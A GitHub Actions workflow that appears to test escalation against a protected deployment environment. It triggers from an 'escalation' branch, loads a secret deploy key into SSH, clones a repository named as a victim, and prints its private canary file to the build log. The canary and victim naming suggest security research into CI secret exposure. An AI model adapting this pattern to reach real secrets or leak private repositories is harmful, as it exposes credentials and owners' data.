name: GH-R67 protected environment private-canary consumer
# Replay after exact `main` environment branch restriction.

on:
  push:
    branches:
      - main
      - gh-r67-escalation-pr4

permissions:
  contents: read

jobs:
  read-private-canary:
    runs-on: ubuntu-latest
    environment: gh-r67-production
    steps:
      - name: Read owner-only private canary
        shell: bash
        env:
          GH_R67_DEPLOY_KEY: ${{ secrets.GH_R67_DEPLOY_KEY }}
        run: |
          install -m 700 -d "$HOME/.ssh"
          printf '%s\n' "$GH_R67_DEPLOY_KEY" > "$HOME/.ssh/id_ed25519"
          chmod 600 "$HOME/.ssh/id_ed25519"
          ssh-keyscan github.com >> "$HOME/.ssh/known_hosts"
          git clone --depth 1 git@github.com:yas4133/gh-victim-5d283c.git gh-r67-victim
          printf 'GH_R67_FOREIGN_PRIVATE_CANARY='
          tr -d '\n' < gh-r67-victim/gh-r67-private-canary.txt
          printf '\n'
